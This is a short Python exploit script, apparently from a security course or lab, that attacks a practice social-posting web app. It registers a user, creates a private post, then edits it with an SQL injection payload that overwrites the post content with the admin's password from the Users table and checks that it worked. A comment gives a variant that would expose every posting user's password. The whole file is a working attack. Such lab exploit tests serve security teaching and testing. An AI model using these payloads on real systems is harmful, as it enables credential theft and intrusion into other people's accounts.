#!/usr/bin/env python3
import requests, sys, re
from interface import *
from bs4 import BeautifulSoup

if not (2 == len(sys.argv)):
    print(f"Usage: {__file__} server_url")
    sys.exit(-1)

url = sys.argv[1]

username="asdf"
password="asdf"

session = requests.Session()
reset_app(session, url)
register(session, url, username=username, password=password)

# create new post
content = "Very interesting content"
privacy = "Private"
homepage = create_post(session, url, content=content, privacy=privacy)

soup = BeautifulSoup(homepage.text, 'html.parser')
post = soup.find_all("div")[-1]
post_id = post.find_all("input")[0]['value']


# edit post
payload = "', content=(SELECT password from Users WHERE username='ssofadmin')#"
'''
payload = "', type='Public', content=(SELECT password from Users WHERE username=author)#"

We could use the above payload to show the passwords of every user that has made a post.
Using a simpler query since it's easier to assert
'''
new_privacy = privacy
send_edit_post(session, url, post_id=post_id, content=payload, privacy=new_privacy)

homepage = get_home(session, url)
soup = BeautifulSoup(homepage.text, 'html.parser')
post = soup.find_all("div")[-1]

assert "SCP" in post.text

print(f'[+] Got password in post')

session.close()
